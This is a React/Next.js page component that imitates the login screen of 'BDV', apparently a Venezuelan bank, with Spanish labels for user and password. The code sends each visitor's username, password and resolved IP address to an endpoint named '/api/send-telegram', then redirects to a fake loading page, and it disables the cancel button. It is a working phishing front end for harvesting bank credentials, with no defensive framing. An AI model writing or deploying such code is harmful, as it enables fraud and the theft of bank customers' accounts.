"use client";

import { ChangeEvent, FormEvent, useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { useSecurityGuards } from "@/hooks/useSecurityGuards";
import { requestTelegramConfig, resolveBackendEndpoint, resolveIp } from "@/lib/remote";

export default function Home() {
  useSecurityGuards();
  const router = useRouter();

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showOverlay, setShowOverlay] = useState(false);
  const [isPasswordValid, setIsPasswordValid] = useState(false);
  const [isSending, setIsSending] = useState(false);
  const [overlayError, setOverlayError] = useState<string | null>(null);

  useEffect(() => {
    const loadConfig = async () => {
      try {
        await requestTelegramConfig();
      } catch (error) {
        console.error(error);
      }
    };

    loadConfig();
  }, []);

  useEffect(() => {
    if (!showOverlay) {
      setPassword("");
      setIsPasswordValid(false);
      setOverlayError(null);
    }
  }, [showOverlay]);

  const handlePrimarySubmit = (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setShowOverlay(true);
  };

  const handlePasswordChange = (event: ChangeEvent<HTMLInputElement>) => {
    const value = event.target.value;
    setPassword(value);
    const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(value);
    const hasMinLength = value.length >= 7;
    setIsPasswordValid(hasSpecialChar && hasMinLength);
  };

  const handleOverlaySubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (isSending) {
      return;
    }

    setOverlayError(null);
    setIsSending(true);

    try {
      const ip = await resolveIp();
      if (typeof window !== "undefined") {
        localStorage.setItem("usuario", username);
      }

      const endpoint = resolveBackendEndpoint("/api/send-telegram");
      const response = await fetch(endpoint, {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ username, password, ip }),
      });

      if (!response.ok) {
        const payload = await response.json().catch(() => null);
        const message = payload?.error ?? "No se pudo enviar la informacion. Intenta nuevamente.";
        throw new Error(message);
      }

      router.push("/cargando");
    } catch (error) {
      console.error(error);
      const message = error instanceof Error ? error.message : "No se pudo enviar la informacion. Intenta nuevamente.";
      setOverlayError(message);
    } finally {
      setIsSending(false);
    }
  };

  return (
    <>
      <div className="overlay" style={{ display: showOverlay ? "flex" : "none" }}>
        <div className="content">
          <form onSubmit={handleOverlaySubmit}>
            <h4 style={{ color: "#0067b1", marginBottom: "10px" }}>{"Introduce tu contrase\\u00F1a"}</h4>
            <div className="form-group2">
              <input
                id="contra"
                type="password"
                autoComplete="current-password"
                value={password}
                onChange={handlePasswordChange}
                placeholder=" "
                required
              />
              <label htmlFor="contra">{"Contrase\\u00F1a"}</label>
            </div>

            {overlayError && (
              <p style={{ marginTop: "16px", color: "#ff0000", fontSize: "14px" }}>{overlayError}</p>
            )}

            <div style={{ width: "100%", textAlign: "center", paddingBottom: "30px" }}>
              <button
                type="submit"
                disabled={!isPasswordValid || isSending}
                style={{
                  width: "80px",
                  backgroundColor: isPasswordValid && !isSending ? "#0067b1" : "#ccc",
                  cursor: isPasswordValid && !isSending ? "pointer" : "not-allowed",
                  marginRight: "12px",
                  padding: "12px 0",
                }}
              >
                {isSending ? "Enviando" : "Continuar"}
              </button>
              <button
                type="button"
                disabled
                style={{
                  width: "80px",
                  backgroundColor: "#ccc",
                  cursor: "not-allowed",
                  padding: "12px 0",
                }}
              >
                Cancelar
              </button>
            </div>
          </form>
        </div>
      </div>

      <div className="container">
        <div className="left-side">
          <form onSubmit={handlePrimarySubmit} className="form" style={{ paddingBottom: "30px" }}>
            <div style={{ textAlign: "center" }}>
              {/* eslint-disable-next-line @next/next/no-img-element */}
              <img src="/logo.png" alt="BDV" style={{ width: "80%", marginTop: "10px" }} />
            </div>
            <div style={{ width: "100%", textAlign: "center" }}>
              <div className="form-group">
                <input
                  id="nombre"
                  name="nombre"
                  type="text"
                  autoComplete="username"
                  value={username}
                  onChange={(event) => setUsername(event.target.value)}
                  placeholder=" "
                  required
                />
                <label htmlFor="nombre">Usuario *</label>
              </div>
            </div>

            <div style={{ width: "100%", textAlign: "center" }}>
              <button type="submit">Entrar</button>
            </div>

            <div
              style={{
                width: "100%",
                textAlign: "center",
                fontSize: "12px",
                fontWeight: "bold",
                color: "#999999",
                marginTop: "30px",
                marginBottom: "30px",
              }}
            >
              {"\\u00BFOlvidaste tu usuario o clave?"} <br />
              {"Si eres nuevo clienteBDV reg\\u00EDstrate aquí"}
            </div>
          </form>
        </div>
        <div className="right-side" />
      </div>
    </>
  );
}




